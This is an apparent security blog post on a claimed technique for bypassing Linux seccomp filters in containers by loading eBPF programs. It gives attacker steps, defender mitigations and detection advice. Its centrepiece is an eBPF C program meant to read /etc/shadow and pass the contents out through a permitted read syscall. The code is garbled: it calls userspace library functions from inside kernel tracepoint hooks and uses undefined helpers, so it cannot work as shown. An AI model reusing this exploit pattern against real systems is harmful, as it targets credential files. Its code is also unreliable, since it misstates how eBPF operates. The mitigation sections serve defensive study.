The Phantom Syscall: Bypassing Seccomp Filters with eBPF

Wut

Leveraging permitted syscalls plus eBPF helpers to make the kernel perform forbidden operations while seccomp remains oblivious. This technique allows attackers to execute operations that should be blocked by seccomp filters, creating “phantom” syscalls that bypass security controls.

graph TD
    A[Permitted Syscall] -->|1. Call| B[eBPF Program]
    B -->|2. Use Helper| C[Kernel Function]
    C -->|3. Execute| D[Forbidden Operation]
    E[Seccomp] -->|4. Unaware| D
    D -->|5. Return Results| A

Why

Because eBPF + misconfiguration => broken isolation. Seccomp filters are widely used to restrict which syscalls a process can make, providing an important security boundary. However, eBPF programs can use kernel helper functions to perform operations that would normally require syscalls, effectively bypassing seccomp restrictions.

Attacker hat on

  1. Identify a target container with seccomp filters but eBPF capabilities
  2. Analyze the seccomp profile to determine which syscalls are permitted
  3. Develop an eBPF program that uses permitted syscalls as entry points
  4. Use eBPF helper functions to perform operations that would normally be blocked
  5. Load the malicious BPF program through a permitted syscall
  6. Trigger the exploit to execute restricted operations
  7. Maintain access through the eBPF program despite seccomp restrictions

Defender hat on

  1. Remove CAP_BPF from container environments
  2. Implement BPF LSM policies to restrict eBPF program loading
  3. Use seccomp profiles that block bpf() syscall and related functions
  4. Monitor for unexpected eBPF programs in container environments
  5. Implement runtime security monitoring that can detect unusual kernel activity
  6. Consider using eBPF-based security tools that can detect malicious eBPF usage

Conclusion

eBPF is all you need. The ability to execute kernel code through eBPF provides attackers with powerful primitives to bypass security controls like seccomp. This technique highlights the importance of treating eBPF capabilities as privileged operations that should be tightly controlled, especially in multi-tenant environments.

Technical Details

Seccomp Architecture

Seccomp (secure computing mode) is a Linux kernel feature that restricts the syscalls a process can make. It operates by:

  • Filtering syscalls based on syscall number and arguments
  • Allowing, blocking, or logging attempted syscalls
  • Providing a security boundary for containerized applications

In container environments, seccomp profiles are often used to restrict containers to a limited set of syscalls, reducing the attack surface.

Exploitation Technique

The exploit leverages eBPF’s ability to execute code in kernel context, bypassing seccomp in several ways:

  1. Indirect Syscall Execution: Using eBPF helper functions that perform operations similar to blocked syscalls
  2. Kernel Function Access: Accessing kernel functions directly, bypassing the syscall interface
  3. Syscall Argument Manipulation: Modifying arguments of permitted syscalls to perform restricted operations
  4. Return Value Spoofing: Altering the return values of syscalls to hide malicious activity

// Simplified eBPF program to bypass seccomp
SEC("tracepoint/syscalls/sys_enter_read")
int bypass_seccomp(struct trace_event_raw_sys_enter *ctx)
{
    // Get the file descriptor
    int fd = ctx->args[0];
    
    // Check if this is our trigger file descriptor
    if (fd == TRIGGER_FD) {
        // Use eBPF helper to access file that would be blocked by seccomp
        // For example, reading a sensitive file like /etc/shadow
        struct bpf_object *obj;
        
        // Open a file that would normally be blocked by seccomp
        obj = bpf_object__open("/etc/shadow");
        if (!obj)
            return 0;
            
        // Read the file contents
        int map_fd = bpf_object__find_map_fd_by_name(obj, "data_map");
        if (map_fd < 0)
            return 0;
            
        // Store the sensitive data in a BPF map for later exfiltration
        char data[MAX_DATA_SIZE];
        bpf_obj_get_info_by_fd(map_fd, data, sizeof(data));
        
        // Update our exfiltration map
        u32 key = 0;
        bpf_map_update_elem(&exfil_map, &key, data, BPF_ANY);
    }
    
    return 0;
}

// Hook the read syscall return to exfiltrate data
SEC("tracepoint/syscalls/sys_exit_read")
int exfil_data(struct trace_event_raw_sys_exit *ctx)
{
    // Check if this is our trigger file descriptor
    if (is_trigger_fd()) {
        // Get the data from our map
        u32 key = 0;
        char *data = bpf_map_lookup_elem(&exfil_map, &key);
        if (!data)
            return 0;
            
        // Copy the sensitive data to the user's buffer
        // This effectively exfiltrates the data through a permitted syscall
        void *user_buf = get_user_buffer();
        bpf_probe_write_user(user_buf, data, MAX_DATA_SIZE);
    }
    
    return 0;
}

Detection Methods

Defenders should monitor for:

  • Unexpected eBPF programs attaching to syscall tracepoints
  • eBPF programs that access sensitive kernel functions
  • Discrepancies between expected and actual process behavior
  • Unusual patterns of permitted syscalls that might be used for eBPF loading
  • Data exfiltration through covert channels

This technique demonstrates why proper eBPF restrictions are critical for maintaining the security boundaries provided by seccomp, especially in container environments where syscall filtering is a key security control.
